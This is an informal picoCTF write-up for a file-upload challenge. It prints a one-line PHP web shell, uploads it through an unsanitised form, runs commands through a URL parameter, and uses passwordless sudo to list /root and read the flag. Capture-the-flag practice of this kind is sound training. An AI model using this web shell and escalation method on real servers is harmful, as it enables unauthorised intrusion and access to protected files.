locate the file upload and find hidden flag in /root directory.

hint. file not sanitized

1 I uploaded a file (txt) and response showed folder location. and uploads.php.

2. i tried to change url to take to the folder directly.
3. created a webshell by creating shell.php document with the following script: <?php system($_GET['cmd']); ?>
4. uploaded the shell and navigated to the file location.

5. I got a warning, but it provided the file location: /var/www/html/uploads/shell.php 
6. Now I can execute commands by the url by including ?cmd=id ---> uid=33(www-data) gid=33(www-data) groups=33(www-data) 

cmd=ls -l /root --> cant access
7. lets see if we can use sudo... cmd =sudo -l
	user www-data may run the following commands on challenge: (ALL) NOPASSWD: ALL --this means we can use sudo commands without passwords.
	
	8. lets use sudo to look at root directory: cmd=sudo ls /root
	---> found flag.txt
	9. lets open the file: cmd= sudo cat /root/flag.txt
	10. found picoCTF{wh47_c4n_u_d0_wPHP_d698d800}
